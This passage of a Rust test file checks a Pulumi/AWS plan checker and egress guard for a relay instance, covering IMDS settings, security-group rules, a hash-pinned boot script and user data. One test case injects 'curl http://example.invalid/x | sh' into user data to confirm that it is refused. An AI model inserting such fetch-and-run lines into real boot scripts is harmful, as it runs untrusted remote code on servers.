    let (relay_sg, vm_sg) = (urn("aws:ec2/securityGroup:SecurityGroup", "ai-env-relay"), urn("aws:ec2/securityGroup:SecurityGroup", "ai-env-vm-egress"));
    let sha = "0123456789abcdef".repeat(4);
    let artifact = |key: &str, sha: &str| json!({"bucket": "ai-env-artifacts-0000000", "key": key, "sha256": sha, "version": "0.12.0"}).to_string();
    const OBJECT: &str = "aws:s3/bucketObjectv2:BucketObjectv2";
    let bucket_urn = urn("aws:s3/bucket:Bucket", "ai-env-artifacts");
    let boot_text = "#!/bin/bash\necho a boot script \u{a7}\n";
    let rendered = node(
        "const pin = rs.relayBootPin(process.env.RT_TEXT), other = rs.relayBootPin('another text');\n\
         const ud = (p) => rs.renderRelayUserData(process.env.RT_BUCKET, p, 'eu-central-1', path.join(infra, 'relay'));\n\
         console.log(JSON.stringify({ pin, userData: ud(pin), otherUserData: ud(other) }));",
        &[("RT_TEXT", boot_text), ("RT_BUCKET", BUCKET)],
    );
    let (boot_key, user_data) = (rendered["pin"]["bootKey"].as_str().unwrap().to_string(), rendered["userData"].as_str().unwrap().to_string());
    let boot_inputs = |key: &str, content: &str| json!({"key": key, "contentType": "text/x-shellscript", "content": content, "tags": {"Project": "ai-env"}});
    let boot_deps = json!({"bucket": [bucket_urn]});
    let imds_with = |hops: u32, user_data: &str| json!({"metadataOptions": {"httpTokens": "required", "httpPutResponseHopLimit": hops}, "userData": user_data});
    let imds = |hops: u32| imds_with(hops, &user_data);
    let parameter = |value: String| json!({"name": "/ai-env/relay/artifact", "type": "String", "tier": "Standard", "insecureValue": value});
    let mut base = inventory_plan();
    set_state(&mut base, "aws:s3/bucket:Bucket", "ai-env-artifacts", json!({"bucket": BUCKET}), json!({}));
    set_state(&mut base, OBJECT, "relay-boot", boot_inputs(&boot_key, boot_text), boot_deps.clone());
    let depends_on = |steps: &mut [Value], on: &[String]| {
        let u = urn(INSTANCE, "ai-env-relay");
        steps.iter_mut().find(|s| s["urn"] == u.as_str()).unwrap()["newState"]["dependencies"] = json!(on);
    };
    depends_on(&mut base, &[urn(OBJECT, "relay-boot")]);
    set_state(&mut base, INSTANCE, "ai-env-relay", imds(1), json!({}));
    set_state(
        &mut base,
        RULE.0,
        RULE.1,
        json!({"ipProtocol": "tcp", "fromPort": 7443, "toPort": 7443, "referencedSecurityGroupId": UNKNOWN}),
        json!({"securityGroupId": [relay_sg], "referencedSecurityGroupId": [vm_sg]}),
    );
    set_state(&mut base, ASSOCIATION, "ai-env-relay", json!({}), json!({"allocationId": [urn("aws:ec2/eip:Eip", "ai-env-relay")], "instanceId": [relay]}));
    set_state(
        &mut base,
        "aws:s3/bucketObjectv2:BucketObjectv2",
        "relay-artifact",
        json!({"key": "relay/ai-env-relay-0123456789abcdef", "contentType": "application/octet-stream", "source": {"hash": sha}}),
        json!({"bucket": [urn("aws:s3/bucket:Bucket", "ai-env-artifacts")]}),
    );
    set_state(&mut base, PARAMETER, "ai-env-relay-artifact", parameter(artifact("relay/ai-env-relay-0123456789abcdef", &sha)), json!({}));
    set_state(&mut base, POLICY, "ai-env-ops", json!({}), json!({"policy": [proxy, relay]}));

    let mut widened: Vec<(&str, Vec<Value>)> = vec![];
    let mut p = base.clone();
    set_state(&mut p, INSTANCE, "ai-env-relay", imds(2), json!({}));
    widened.push(("relay instance IMDS: [\"required\",2], expected [\"required\",1]", p));
    let mut p = base.clone();
    set_state(&mut p, RULE.0, RULE.1, json!({"ipProtocol": "tcp", "fromPort": 7443, "toPort": 7443, "cidrIpv4": "0.0.0.0/0"}), json!({"securityGroupId": [relay_sg]}));
    widened.push(("the relay security group allows only", p));
    let mut p = base.clone();
    set_state(&mut p, ASSOCIATION, "ai-env-relay", json!({}), json!({"allocationId": [urn("aws:ec2/eip:Eip", "ai-env-relay")], "instanceId": [proxy]}));
    widened.push(("instanceId depends on aws:ec2/instance:Instance::ai-env-egress-proxy, expected aws:ec2/instance:Instance::ai-env-relay", p));
    let mut p = base.clone();
    set_state(&mut p, PARAMETER, "ai-env-relay-artifact", parameter(artifact("relay/ai-env-relay-ffffffffffffffff", &"f".repeat(64))), json!({}));
    widened.push(("relay artifact parameter: key", p));
    let mut p = base.clone();
    set_state(&mut p, POLICY, "ai-env-ops", json!({}), json!({"policy": [proxy]}));
    widened.push(("policy does not depend on aws:ec2/instance:Instance::ai-env-relay", p));
    // The boot object.
    let mut p = base.clone();
    set_state(&mut p, OBJECT, "relay-boot", boot_inputs("relay/ai-env-relay-0123456789abcdef", boot_text), boot_deps.clone());
    widened.push(("relay boot key: \"relay/ai-env-relay-0123456789abcdef\" is not relay/ai-env-relay-boot-<sha256[:16]>", p));
    let mut p = base.clone();
    set_state(&mut p, OBJECT, "relay-boot", boot_inputs(&boot_key, "#!/bin/bash\necho another text\n"), boot_deps.clone());
    widened.push(("is not its content's, relay/ai-env-relay-boot-", p));
    let mut p = base.clone();
    set_state(&mut p, OBJECT, "relay-boot", boot_inputs(&boot_key, boot_text), json!({"bucket": [urn("aws:s3/bucket:Bucket", "ai-env-transcripts")]}));
    widened.push(("aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: bucket depends on aws:s3/bucket:Bucket::ai-env-transcripts, expected aws:s3/bucket:Bucket::ai-env-artifacts", p));
    let mut p = base.clone();
    let mut inputs = boot_inputs(&boot_key, boot_text);
    inputs["contentType"] = json!("text/plain");
    set_state(&mut p, OBJECT, "relay-boot", inputs, boot_deps.clone());
    widened.push(("relay boot contentType: \"text/plain\", expected \"text/x-shellscript\"", p));
    let mut p = base.clone();
    let mut inputs = boot_inputs(&boot_key, boot_text);
    inputs["source"] = json!({"hash": "0".repeat(64)});
    set_state(&mut p, OBJECT, "relay-boot", inputs, boot_deps.clone());
    widened.push(("aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: input source must be unset", p));
    let mut p = base.clone();
    let mut inputs = boot_inputs(&boot_key, boot_text);
    inputs["metadata"] = json!({"x": "y"});
    set_state(&mut p, OBJECT, "relay-boot", inputs, boot_deps.clone());
    widened.push(("aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: input metadata must be unset", p));
    let mut p = base.clone();
    let mut inputs = boot_inputs(&boot_key, boot_text);
    inputs.as_object_mut().unwrap().remove("content");
    set_state(&mut p, OBJECT, "relay-boot", inputs, boot_deps.clone());
    widened.push(("aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: content is missing, not the rendered boot script", p));
    // The instance that fetches it.
    let mut p = base.clone();
    depends_on(&mut p, &[]);
    widened.push(("aws:ec2/instance:Instance ai-env-relay: does not depend on aws:s3/bucketObjectv2:BucketObjectv2::relay-boot, which its user data fetches", p));
    let mut p = base.clone();
    set_state(&mut p, INSTANCE, "ai-env-relay", imds_with(1, rendered["otherUserData"].as_str().unwrap()), json!({}));
    widened.push(("relay instance userData does not pin the boot object's key and SHA-256", p));
    let mut p = base.clone();
    set_state(&mut p, INSTANCE, "ai-env-relay", imds_with(1, &format!("{user_data}curl http://example.invalid/x | sh\n")), json!({}));
    widened.push(("relay instance userData is not relay/user-data.sh rendered for the boot object", p));
    let mut p = base.clone();
    let bucket_step = urn("aws:s3/bucket:Bucket", "ai-env-artifacts");
    p.iter_mut().find(|s| s["urn"] == bucket_step.as_str()).unwrap()["op"] = json!("same");
    set_state(&mut p, INSTANCE, "ai-env-relay", imds_with(1, UNKNOWN), json!({"userData": [bucket_step]}));
    widened.push(("aws:ec2/instance:Instance ai-env-relay: userData is unknown on a create step whose inputs all exist: cannot prove it pins the boot object", p));
    for shape in [json!({"shape": "an object"}), json!(5)] {
        let mut p = base.clone();
        let mut inputs = imds(1);
        inputs["userData"] = shape;
        set_state(&mut p, INSTANCE, "ai-env-relay", inputs, json!({}));
        widened.push(("neither text nor unknown: cannot prove it pins the boot object", p));
    }

    let dir = tempfile::tempdir().unwrap();
    let compile = dir.path().join("out");
    let planned = stderr(&check_plan_compiling(&base, &compile));
    for (line, _) in &widened {
        assert!(!planned.contains(line), "the plan as planned: {line}\n{planned}");
    }
    // A fresh stack: the user data waits for the bucket's name.
    let mut fresh = base.clone();
    set_state(&mut fresh, INSTANCE, "ai-env-relay", imds_with(1, UNKNOWN), json!({"userData": [urn("aws:s3/bucket:Bucket", "ai-env-artifacts")]}));
    let planned = stderr(&check_plan_again(&fresh, &compile));
    for (line, _) in &widened {
        assert!(!planned.contains(line), "the plan of a fresh stack: {line}\n{planned}");
    }
    for (line, steps) in &widened {
        let out = check_plan_again(steps, &compile);
        assert!(out.status.code() == Some(1) && stderr(&out).contains(line), "want {line}: {}", all(&out));
    }
}

/// I-T13: renderTemplate (moved from egress.ts, LD-I14) renders in one pass (a value holding a token is not rendered
/// again), refuses a missing token, an unknown leftover and values for other tokens with S5's texts, and keeps a kept one.
#[test]
fn render_template_is_one_pass_and_refuses_leftovers() {
    let t = tempfile::tempdir().unwrap();
    for (file, body) in [("one.txt", "x=@A@ y=@B@\n"), ("missing.txt", "x=@A@\n"), ("left.txt", "x=@A@ @C@\n"), ("kept.txt", "x=@A@ @DIR@\n")] {
        std::fs::write(t.path().join(file), body).unwrap();
    }
    let dir = t.path().display().to_string();
    let r = node(
        r#"const dir = process.env.RT_DIR;
const r = (f, tokens, values, keep) => { try { return { ok: spec.renderTemplate(dir, f, tokens, values, keep) }; } catch (e) { return { err: e.message }; } };
console.log(JSON.stringify({
  onePass: r('one.txt', ['A', 'B'], { A: '@B@', B: 'bee' }, ['@B@']),
  missing: r('missing.txt', ['A', 'B'], { A: 'a', B: 'b' }),
  leftover: r('left.txt', ['A'], { A: 'a' }),
  leftoverKeeping: r('left.txt', ['A'], { A: 'a' }, ['@DIR@']),
  otherValues: r('one.txt', ['A', 'B'], { A: 'a', Z: 'z' }),
  kept: r('kept.txt', ['A'], { A: 'a' }, ['@DIR@']),
}));"#,
        &[("RT_DIR", &dir)],
    );
    assert_eq!(r["onePass"], json!({"ok": "x=@B@ y=bee\n"}), "one pass");
    assert_eq!(r["missing"], json!({"err": format!("{dir}/missing.txt: the placeholder(s) @B@ are missing (contract 3)")}));
    assert_eq!(r["leftover"], json!({"err": format!("{dir}/left.txt: unknown placeholder(s) @C@ left after rendering (none is filled later)")}));
    assert_eq!(r["leftoverKeeping"], json!({"err": format!("{dir}/left.txt: unknown placeholder(s) @C@ left after rendering (only @DIR@ is filled on the proxy)")}));
    assert_eq!(r["otherValues"], json!({"err": "egress: render one.txt: values for A, Z, expected A, B"}));
    assert_eq!(r["kept"], json!({"ok": "x=a @DIR@\n"}));
}

/// The tsc output of egress.ts (the guard), image.ts and relay.ts, compiled once per test run beside [`compiled`]'s: its
/// own directory, so only the tests of those pay for the Pulumi SDK's types. relay.ts finds infra/relay beside it.
fn compiled_guard() -> &'static Path {
    static OUT: OnceLock<PathBuf> = OnceLock::new();
    OUT.get_or_init(|| {
        let infra = infra();
        let out = Path::new(env!("CARGO_TARGET_TMPDIR")).join(format!("relay-guard-tsc-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&out);
        let mut cmd = Command::new(infra.join("node_modules/.bin/tsc"));
        cmd.args(["--strict", "--target", "es2022", "--module", "commonjs", "--moduleResolution", "node", "--types", "node", "--rootDir", ".", "--outDir"])
            .arg(&out)
            .args(["egress.ts", "image.ts", "relay.ts"])
            .current_dir(&infra)
            .stdin(Stdio::null());
        let o = bounded(&mut cmd, "tsc");
        assert!(o.status.success(), "tsc: {}", all(&o));
        copy_dir(&infra.join("relay"), &out.join("relay"));
        out
    })
}

/// The egress guard as the engine calls the transform (I-T56, I-T58): `transform`, the spec (`spec`, `pol`, `cfg`,
/// `egress`), the existing resources' ids tracked known and the relay's three unknown (creates a targeted run skips),
/// `tags`, and `run(cases)`, which prints each case's refusal ('' when it passed) as one JSON object.
const GUARD_PRELUDE: &str = r#"const path = require('path');
const out = process.env.RT_OUT, infra = process.env.RT_INFRA;
const pulumi = require('@pulumi/pulumi');
let transform;
pulumi.runtime.registerResourceTransform = (t) => { transform = t; };
const spec = require(path.join(out, 'egress-spec.js')), pol = require(path.join(out, 'policies.js'));
const cfg = spec.loadEgressConfig(path.join(infra, 'egress-config.json'));
const egress = spec.egressSpec(cfg);
const guard = require(path.join(out, 'egress.js')).guardEgress(egress, require(path.join(out, 'image.js')).loadImageConfig(path.join(infra, 'image-config.json')),
  spec.readProxyDocuments(path.join(infra, 'proxy', 'documents')));
for (const [k, v] of [['vpc', 'vpc-1'], ['subnet:proxy', 'subnet-p'], ['subnet:vms', 'subnet-v'], ['sg:vm', 'sg-vm'], ['sg:proxy', 'sg-proxy']]) guard.track(k, pulumi.output(v));
for (const k of ['sg:relay', 'relay-instance', 'relay-eip']) guard.track(k, pulumi.output(pulumi.unknown));
const tags = { Project: 'ai-env' };
const BOOT_TEXT = '#!/bin/bash\necho a boot script\n';
const BOOT_OBJECT = (bucket) => ({ bucket, key: require(path.join(out, 'relay-spec.js')).relayBootPin(BOOT_TEXT).bootKey, content: BOOT_TEXT, contentType: 'text/x-shellscript', tags });
const run = async (cases) => {
  const r = {};
  for (const [what, type, name, props] of cases) {
    try { await transform({ type, name, custom: true, props, opts: {} }); r[what] = ''; } catch (e) { r[what] = e.message; }
  }
  console.log(JSON.stringify(r));
  process.exit(0);
};
"#;

/// [`GUARD_PRELUDE`], then `cases` (which ends with `run(…)`), in one node process: each case's refusal by its name.
/// `preview` sets the SDK's dry run (`PULUMI_NODEJS_DRY_RUN`): the transform of a preview, else of an update.
fn guard_results(cases: &str, preview: bool) -> serde_json::Map<String, Value> {
    let infra = infra();
    let mut cmd = Command::new("node");
    cmd.arg("-e")
        .arg(format!("{GUARD_PRELUDE}{cases}"))
        .env("NODE_PATH", infra.join("node_modules"))
        .env("RT_OUT", compiled_guard())
        .env("RT_INFRA", &infra)
        .env("PULUMI_NODEJS_DRY_RUN", if preview { "true" } else { "false" })
        .stdin(Stdio::null());
    let o = bounded(&mut cmd, "node");
    assert!(o.status.success(), "node: {}", all(&o));
    let r: Value = serde_json::from_slice(&o.stdout).unwrap_or_else(|e| panic!("node printed no JSON ({e}): {}", all(&o)));
    r.as_object().unwrap().clone()
}

/// I-T56 (S13 part B): deploy-policies' `pulumi up --target` before the relay exists skips the relay's creates, so the
/// guard sees every input computed from one of them unknown (the profile's name, the group's and the Elastic IP's ids):
/// it lets them through, as check-plan.ts holds them by URN in the whole plan, and still refuses a known wrong profile.
/// The guard is called as the engine calls the transform; the existing resources' ids are known, the relay's unknown.
/// These are the preview's shapes (the unknown sentinel, or an unknown Output), in a preview; I-T58 has the update's.
#[test]
fn the_guard_passes_a_targeted_runs_skipped_relay_creates() {
    let r = guard_results(
        r#"if (!pulumi.runtime.isDryRun()) throw new Error('a preview is meant (isDryRun true)');
const U = pulumi.unknown, UO = pulumi.output(pulumi.unknown);
const instance = (profile, sg) => ({ ami: 'ami-1', instanceType: cfg.relayInstanceType, subnetId: 'subnet-p', privateIp: cfg.relayIp, associatePublicIpAddress: true,
  vpcSecurityGroupIds: [sg], iamInstanceProfile: profile, metadataOptions: { httpEndpoint: 'enabled', httpTokens: 'required', httpPutResponseHopLimit: 1, instanceMetadataTags: 'disabled' },
  rootBlockDevice: { volumeType: 'gp3', volumeSize: 8, encrypted: true, deleteOnTermination: true }, creditSpecification: { cpuCredits: 'standard' },
  userData: '#!/bin/bash\n', userDataReplaceOnChange: true, tags, volumeTags: tags });
const cases = [
  ['instance, unknown profile and group', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(U, U)],
  ['instance, unknown Outputs', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(UO, UO)],
  ['instance, its profile', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(pol.RELAY_INSTANCE_PROFILE_NAME, U)],
  ['instance, the proxy profile', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(cfg.proxyInstanceProfileName, U)],
  ['instance, its user data waiting for the bucket', 'aws:ec2/instance:Instance', spec.NET.relayInstance, { ...instance(U, U), userData: UO }],
  ['boot object', 'aws:s3/bucketObjectv2:BucketObjectv2', spec.NET.relayBoot, BOOT_OBJECT(U)],
  ['eip', 'aws:ec2/eip:Eip', spec.NET.relayEip, { domain: 'vpc', tags }],
  ['eip association', 'aws:ec2/eipAssociation:EipAssociation', spec.NET.relayEip, { allocationId: U, instanceId: UO }],
  ['group', 'aws:ec2/securityGroup:SecurityGroup', cfg.relaySecurityGroupName, { name: cfg.relaySecurityGroupName, description: egress.securityGroups.relay.description, vpcId: 'vpc-1', tags }],
  ['profile', 'aws:iam/instanceProfile:InstanceProfile', pol.RELAY_INSTANCE_PROFILE_NAME, { name: pol.RELAY_INSTANCE_PROFILE_NAME, role: U, tags }],
  ['role policy', 'aws:iam/rolePolicy:RolePolicy', pol.RELAY_ROLE_NAME, { name: pol.RELAY_ROLE_NAME, role: U, policy: UO }],
  ['ssm attachment', 'aws:iam/rolePolicyAttachment:RolePolicyAttachment', pol.RELAY_ROLE_NAME + '-ssm', { role: U, policyArn: 'arn:aws:iam::aws:policy/AmazonSSMManagedEC2InstanceDefaultPolicy' }],
  ['artifact parameter', 'aws:ssm/parameter:Parameter', spec.NET.relayArtifactParameter, { name: cfg.relayParameterPrefix + '/artifact', type: 'String', tier: 'Standard', dataType: 'text', insecureValue: UO, description: 'd', tags }],
];
for (const k of ['vm', 'relay']) for (const rule of egress.securityGroups[k].rules) {
  const name = spec.ruleName(egress, k, rule);
  const peer = 'sg' in rule.peer ? { referencedSecurityGroupId: 'sg-' + rule.peer.sg } : { cidrIpv4: rule.peer.cidr };
  cases.push(['rule ' + name, 'aws:vpc/securityGroup' + (rule.direction === 'ingress' ? 'IngressRule:SecurityGroupIngressRule' : 'EgressRule:SecurityGroupEgressRule'), name,
    { securityGroupId: k === 'relay' ? U : 'sg-vm', ipProtocol: rule.protocol, fromPort: rule.port, toPort: rule.port, description: rule.description, ...peer, tags }]);
}
run(cases);"#,
        true,
    );
    assert_eq!(
        r["instance, the proxy profile"],
        "egress guard (infra/egress.ts) refused aws:ec2/instance:Instance ai-env-relay: iamInstanceProfile must be \"ai-env-relay\", got \"ai-env-egress-proxy\"",
        "a known wrong profile is still refused"
    );
    let refused: Vec<_> = r.iter().filter(|(k, v)| *k != "instance, the proxy profile" && *v != "").collect();
    assert!(refused.is_empty(), "the targeted run's inputs are refused: {refused:?}");
    // The VM group's two rules and the relay group's seven, beside the thirteen cases.
    assert_eq!(r.len(), 22, "{r:?}");
}

/// I-T58 (S13 part B, §Q.14): the same targeted run in its update phase. An update hands the transform each input
/// computed from a skipped create's id as undefined (the SDK maps the unknown sentinel so outside a preview), the
/// input-valued outputs (the profile's and the role's names) known. B1's run refused the relay group's seven rules
/// there (`logs/67.txt`). The guard lets such a reference through only while the referenced id is itself unknown, and
/// only as an input the program set: an undefined reference (a key's or a list element's) to a known id, one to an id
/// the guard never tracked, one unknown in another shape (an unknown Output) to a known id, and a reference left out
/// are refused; the proxy instance's known group passes.
#[test]
fn the_guard_passes_a_targeted_updates_skipped_relay_creates() {
    let r = guard_results(
        r#"if (pulumi.runtime.isDryRun()) throw new Error('an update is meant (isDryRun false)');
const U = undefined;
const instance = (subnet) => ({ ami: 'ami-1', instanceType: cfg.relayInstanceType, subnetId: subnet, privateIp: cfg.relayIp, associatePublicIpAddress: true,
  vpcSecurityGroupIds: [U], iamInstanceProfile: pol.RELAY_INSTANCE_PROFILE_NAME, metadataOptions: { httpEndpoint: 'enabled', httpTokens: 'required', httpPutResponseHopLimit: 1, instanceMetadataTags: 'disabled' },
  rootBlockDevice: { volumeType: 'gp3', volumeSize: 8, encrypted: true, deleteOnTermination: true }, creditSpecification: { cpuCredits: 'standard' },
  userData: '#!/bin/bash\n', userDataReplaceOnChange: true, tags, volumeTags: tags });
const cases = [
  ['instance', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance('subnet-p')],
  ['instance, its user data the rendered text', 'aws:ec2/instance:Instance', spec.NET.relayInstance, { ...instance('subnet-p'), userData: '#!/bin/bash\nexec /bin/bash /root/x\n' }],
  ['boot object', 'aws:s3/bucketObjectv2:BucketObjectv2', spec.NET.relayBoot, BOOT_OBJECT('ai-env-artifacts-0000000')],
  ['eip', 'aws:ec2/eip:Eip', spec.NET.relayEip, { domain: 'vpc', tags }],
  ['eip association', 'aws:ec2/eipAssociation:EipAssociation', spec.NET.relayEip, { allocationId: U, instanceId: U }],
  ['group', 'aws:ec2/securityGroup:SecurityGroup', cfg.relaySecurityGroupName, { name: cfg.relaySecurityGroupName, description: egress.securityGroups.relay.description, vpcId: 'vpc-1', tags }],
  ['profile', 'aws:iam/instanceProfile:InstanceProfile', pol.RELAY_INSTANCE_PROFILE_NAME, { name: pol.RELAY_INSTANCE_PROFILE_NAME, role: pol.RELAY_ROLE_NAME, tags }],
  ['role policy', 'aws:iam/rolePolicy:RolePolicy', pol.RELAY_ROLE_NAME, { name: pol.RELAY_ROLE_NAME, role: U, policy: '{}' }],
  ['ssm attachment', 'aws:iam/rolePolicyAttachment:RolePolicyAttachment', pol.RELAY_ROLE_NAME + '-ssm', { role: pol.RELAY_ROLE_NAME, policyArn: 'arn:aws:iam::aws:policy/AmazonSSMManagedEC2InstanceDefaultPolicy' }],
  ['artifact parameter', 'aws:ssm/parameter:Parameter', spec.NET.relayArtifactParameter, { name: cfg.relayParameterPrefix + '/artifact', type: 'String', tier: 'Standard', dataType: 'text', insecureValue: '{}', description: 'd', tags }],
  ['instance, its subnet undefined', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(U)],
  ['eip association, no instance', 'aws:ec2/eipAssociation:EipAssociation', spec.NET.relayEip, { allocationId: U }],
  ['instance, its subnet an unknown Output', 'aws:ec2/instance:Instance', spec.NET.relayInstance, instance(pulumi.output(pulumi.unknown))],
  ['proxy instance', 'aws:ec2/instance:Instance', spec.NET.instance,
    { ...instance('subnet-p'), privateIp: cfg.proxyIp, instanceType: cfg.instanceType, iamInstanceProfile: cfg.proxyInstanceProfileName, vpcSecurityGroupIds: ['sg-proxy'] }],
  ['proxy instance, its group undefined', 'aws:ec2/instance:Instance', spec.NET.instance,
    { ...instance('subnet-p'), privateIp: cfg.proxyIp, instanceType: cfg.instanceType, iamInstanceProfile: cfg.proxyInstanceProfileName }],
  ['proxy route association, its table undefined', 'aws:ec2/routeTableAssociation:RouteTableAssociation', spec.NET.proxy, { subnetId: 'subnet-p', routeTableId: U }],
];
for (const k of ['vm', 'relay']) for (const rule of egress.securityGroups[k].rules) {
  const name = spec.ruleName(egress, k, rule);
  const peer = 'sg' in rule.peer ? { referencedSecurityGroupId: 'sg-' + rule.peer.sg } : { cidrIpv4: rule.peer.cidr };
  cases.push(['rule ' + name, 'aws:vpc/securityGroup' + (rule.direction === 'ingress' ? 'IngressRule:SecurityGroupIngressRule' : 'EgressRule:SecurityGroupEgressRule'), name,
    { securityGroupId: k === 'relay' ? U : 'sg-vm', ipProtocol: rule.protocol, fromPort: rule.port, toPort: rule.port, description: rule.description, ...peer, tags }]);
}
run(cases);"#,
        false,
    );
    let known = |field: &str, key: &str| format!("{field} must reference the egress {key} (unknown in an update while the egress {key}'s id is known)");
    let refusals = [
        ("instance, its subnet undefined", format!("aws:ec2/instance:Instance ai-env-relay: {}", known("subnetId", "subnet:proxy")), "an undefined reference to a known id"),
        ("instance, its subnet an unknown Output", format!("aws:ec2/instance:Instance ai-env-relay: {}", known("subnetId", "subnet:proxy")), "an unknown Output to a known id"),
        ("proxy instance, its group undefined", format!("aws:ec2/instance:Instance ai-env-egress-proxy: {}", known("vpcSecurityGroupIds[0]", "sg:proxy")), "an undefined list element to a known id"),
        (
            "proxy route association, its table undefined",
            "aws:ec2/routeTableAssociation:RouteTableAssociation ai-env-egress-proxy: routeTableId must reference the egress rt:proxy (unknown in an update while the egress rt:proxy's id is not tracked)".to_string(),
            "an undefined reference to an id the guard never tracked",
        ),
        (
            "eip association, no instance",
            "aws:ec2/eipAssociation:EipAssociation ai-env-relay: instanceId must reference the egress relay-instance".to_string(),
            "a reference the program left out, though the instance is a skipped create",
        ),
    ];
    for (case, want, what) in &refusals {
        assert_eq!(r[*case], format!("egress guard (infra/egress.ts) refused {want}"), "{what} is refused");
    }
    let refused: Vec<_> = r.iter().filter(|(k, v)| !refusals.iter().any(|(case, _, _)| *case == k.as_str()) && *v != "").collect();
    assert!(refused.is_empty(), "the targeted update's inputs are refused: {refused:?}");
    // The VM group's two rules and the relay group's seven, beside the sixteen cases.
    assert_eq!(r.len(), 25, "{r:?}");
}

/// LD-R56: the guard holds the boot object as it holds the artifact: its one key shape (the hash of its literal content),
/// its content type, and no other property; and no third object of the relay. Its bucket is check-plan.ts's, by URN
/// (I-T12), as the artifact's is.
#[test]
fn the_guard_holds_the_boot_object_as_the_artifact() {
    let r = guard_results(
        r#"const object = 'aws:s3/bucketObjectv2:BucketObjectv2', name = spec.NET.relayBoot, good = BOOT_OBJECT('ai-env-artifacts-0000000');
const { key, content, contentType, ...rest } = good;
run([
  ['as relay.ts sets it', object, name, good],
  ['the artifact key shape', object, name, { ...good, key: 'relay/ai-env-relay-0123456789abcdef' }],
  ['another text under the key', object, name, { ...good, content: content + '# another text\n' }],
  ['no content', object, name, { key, contentType, ...rest }],
  ['a source beside it', object, name, { ...good, source: 'x' }],
  ['a public ACL', object, name, { ...good, acl: 'public-read' }],
  ['another content type', object, name, { ...good, contentType: 'text/plain' }],
  ['a third object', object, 'relay-boot-2', good],
]);"#,
        false,
    );
    assert_eq!(r["as relay.ts sets it"], "", "{r:?}");
    let refused = |what: &str| format!("egress guard (infra/egress.ts) refused aws:s3/bucketObjectv2:BucketObjectv2 relay-boot: {what}");
    assert_eq!(r["the artifact key shape"], refused("key must be relay/ai-env-relay-boot-<sha256[:16]>, got \"relay/ai-env-relay-0123456789abcdef\""));
    for case in ["another text under the key", "no content"] {
        let got = r[case].as_str().unwrap();
        assert!(got.starts_with(&refused("content must be the literal text whose SHA-256 the key relay/ai-env-relay-boot-")), "{case}: {got}");
    }
    assert_eq!(r["a source beside it"], refused("input source is outside the stack spec"));
    assert_eq!(r["a public ACL"], refused("input acl is outside the stack spec"));
    assert_eq!(r["another content type"], refused("contentType must be \"text/x-shellscript\", got \"text/plain\""));
    assert!(r["a third object"].as_str().unwrap().contains("not in the stack inventory (infra/egress-spec.ts stackInventory): aws:s3/bucketObjectv2:BucketObjectv2 relay-boot-2"), "{r:?}");
}

// ---- the reload unit (§I-infra.6.2) ----

/// The bucket the tests' artifact names (the printer's placeholder suffix).
const BUCKET: &str = "ai-env-artifacts-0000000";
/// The one `get-parameters` of every run (I-R30), as the fake aws logs it.
const GET_PARAMETERS: &str = "ssm get-parameters --names /ai-env/relay/artifact /ai-env/relay/workers /ai-env/relay/grants /ai-env/relay/token-signers /ai-env/relay/peers /ai-env/relay/access /ai-env/relay/tls --with-decryption --region eu-central-1 --endpoint-url https://ssm.eu-central-1.amazonaws.com --output json";
/// The parameters published into live/, and their files.
const PUBLISHED: [(&str, &str); 6] = [("workers", "workers.json"), ("grants", "grants.json"), ("token-signers", "token-signers.json"), ("peers", "peers.json"), ("access", "access.json"), ("tls", "tls.pem")];
/// Everything live/ may ever hold.
const LIVE: [&str; 7] = ["access.json", "fetched", "grants.json", "peers.json", "tls.pem", "token-signers.json", "workers.json"];
/// The binaries the artifact names in turn (any bytes: the unit only hashes them).
const V1: &[u8] = b"ai-env-relay test binary, version one\n";
const V2: &[u8] = b"ai-env-relay test binary, version two\n";
const V3: &[u8] = b"ai-env-relay test binary, version three\n";

/// A list document as I-R77 has the tests write them: a low-entropy placeholder, `n` telling them apart.
fn placeholder(n: u32) -> String {
    format!("{{\"placeholder\":\"0199a1b2-0000-7000-8000-{n:012}\"}}")
}

/// A peers list (R-85) of one documentation network: the reload publishes any JSON, the relay judges it.
fn peers(cidr: &str) -> String {
    json!([{"cidr": cidr, "label": "lab", "not_after": "2099-12-31T23:59:59Z"}]).to_string()
}

/// An access list (R-143) of one placeholder chat and these grants: the reload publishes any JSON, the relay judges it.
fn access(grants: &[&str]) -> String {
    json!([{"chat": "0199a1b2-0000-7000-8000-0000000012a3", "grants": grants, "not_after": "2099-12-31T23:59:59Z"}]).to_string()
}

/// A peers list of these (cidr, not_after), labelled in turn.
fn peer_list(entries: &[(&str, &str)]) -> String {
    Value::Array(entries.iter().enumerate().map(|(i, (cidr, not_after))| json!({"cidr": cidr, "label": format!("peer-{i}"), "not_after": not_after})).collect()).to_string()
}

/// /proc/swaps's first line.
const SWAPS_HEADER: &str = "Filename                                Type            Size            Used            Priority\n";

/// A PEM block built at run time (I-R78: no key block in any file), its body one base64 line of `body` repeated.
fn pem(label: &str, body: &str) -> String {
    let dashes = "-".repeat(5);
    format!("{dashes}BEGIN {label}{dashes}\n{}\n{dashes}END {label}{dashes}\n", body.repeat(16))
}

fn key_block(body: &str) -> String {
    pem(&["PRIVATE", "KEY"].join(" "), body)
}

/// A `tls` value as I-R31 wants it: a certificate block, then one PKCS#8 key block.
fn tls_pair(body: &str) -> String {
    format!("{}{}", pem("CERTIFICATE", body), key_block(body))
}

fn binary_name(sha16: &str) -> String {
    format!("ai-env-relay-{sha16}")
}

fn now() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs()
}

/// `body` after infra/relay/reload.py is loaded as the module `m` (`/usr/bin/python3 -I -B -c`: imported, never run, so
/// nothing is fetched or written but what `body` writes, and no bytecode lands in infra/relay), in `dir`, with `args`
/// after reload.py's path in `sys.argv`; its stdout.
fn reload_module(dir: &Path, body: &str, args: &[&str]) -> String {
    let prelude = "import importlib.util, json, os, sys\n\
        spec = importlib.util.spec_from_file_location('ai_env_relay_reload', sys.argv[1])\n\
        m = importlib.util.module_from_spec(spec)\n\
        spec.loader.exec_module(m)\n";
